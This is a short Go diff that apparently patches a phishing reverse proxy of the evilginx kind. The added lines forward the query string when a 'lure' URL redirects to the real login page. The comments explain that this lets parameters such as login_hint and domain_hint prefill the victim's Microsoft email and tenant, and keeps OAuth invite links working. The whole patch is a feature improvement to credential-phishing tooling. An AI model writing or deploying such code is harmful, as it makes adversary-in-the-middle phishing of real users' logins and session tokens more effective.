@@ -801,6 +801,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                     rurl = "https://" + foundLure.Hostname + u.Path
                                     ps.LureHostname = foundLure.Hostname
                                 }
+                                // Carry the query string across the lure -> login redirect.
+                                // Flows rely on this: ?login_hint=user@x.com makes Microsoft
+                                // prefill the email, ?domain_hint= pins the tenant, and OAuth
+                                // invite links carry their parameters here.
+                                if q := req.URL.RawQuery; q != "" && !strings.Contains(rurl, "?") {
+                                    rurl += "?" + q
+                                }
                                 resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
                                 if resp != nil {
                                     resp.Header.Add("Location", rurl)
